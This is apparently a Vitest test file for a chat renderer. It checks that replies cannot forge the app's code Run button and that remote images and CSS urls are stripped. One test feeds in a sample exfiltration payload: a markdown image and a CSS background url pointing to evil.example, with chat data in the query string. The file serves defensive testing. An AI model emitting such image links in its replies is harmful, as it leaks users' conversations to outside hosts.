// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { isOurRunButton, remoteUrl, renderMessage, RUN_KEY } from "./render";

describe("a reply's own HTML can't run code or load from elsewhere", () => {
	it("keeps the app's Run button and refuses one a reply built", () => {
		const forged =
			'<div class="ccez-code"><button data-code-run="0" class="ccez-code-run">Run</button></div>\n\n```bash\necho hi\n```';
		const html = renderMessage(forged, false).html;
		const box = document.createElement("div");
		box.innerHTML = html;
		const runs = [...box.querySelectorAll("[data-code-run]")];
		expect(runs.length).toBe(2);
		expect(runs.filter((b) => isOurRunButton(b)).length).toBe(1);
		expect(RUN_KEY.length).toBeGreaterThan(8);
	});
	it("drops remote images and CSS urls, keeps links", () => {
		const html = renderMessage(
			'Voilà ![x](https://evil.example/p.png?chat=secret) <span style="background:url(https://evil.example/a)">a</span> [lien](https://example.fr)',
			false
		).html;
		expect(html).not.toContain("evil.example");
		expect(html).toContain('href="https://example.fr"');
		expect(remoteUrl("https://evil.example/p.png")).toBe(true);
		expect(remoteUrl("//evil.example/p.png")).toBe(true);
		expect(remoteUrl("data:image/png;base64,AAAA")).toBe(false);
		expect(remoteUrl("blob:https://x/1")).toBe(false);
	});
});
